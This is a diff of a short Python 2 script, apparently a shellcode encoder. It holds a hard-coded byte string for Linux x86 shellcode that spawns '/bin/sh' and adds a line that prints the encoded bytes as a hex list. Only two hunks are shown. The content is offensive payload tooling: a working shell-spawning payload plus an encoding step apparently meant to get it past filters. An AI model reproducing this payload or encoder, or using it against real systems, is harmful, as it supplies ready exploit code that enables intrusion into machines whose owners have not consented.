@@ -1,8 +1,8 @@
 # coding: utf-8
 #Author: Lucas Kauffman
 #License: GPLv3 (http://www.gnu.org/licenses/gpl-3.0.txt)
+#Software provided without any warranty
 
-#our unencoded shellcode
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 #if the length is uneven, prepend a nop instruction 
 if len(shellcode)%2 == 1:
@@ -49,4 +49,5 @@ for byte in encodedShellcode:
 	encodedShellcode2.append('0x'+'%x'%byte)
 	encodedShellcode2.append(',')
 encodedShellcode2[-1]=''
+print ''.join(encodedShellcode2)
 
